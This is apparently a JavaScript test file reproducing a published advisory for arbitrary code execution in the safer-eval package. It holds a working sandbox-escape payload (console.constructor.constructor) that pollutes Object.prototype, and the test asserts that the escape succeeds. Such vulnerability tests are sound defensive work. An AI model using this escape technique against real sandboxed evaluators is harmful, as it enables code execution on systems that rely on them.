//https://github.com/advisories/GHSA-r3x4-wr4h-pw33
test("Arbitrary code execution in safer-eval", () => {
  const saferEval = require("safer-eval");
  expect({}.polluted).toBe(undefined);

  try {
    saferEval(
      "console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env"
    );
  } catch (error) {
    //console.log(error);
  }

  expect({}.polluted).toBe("yes");
});
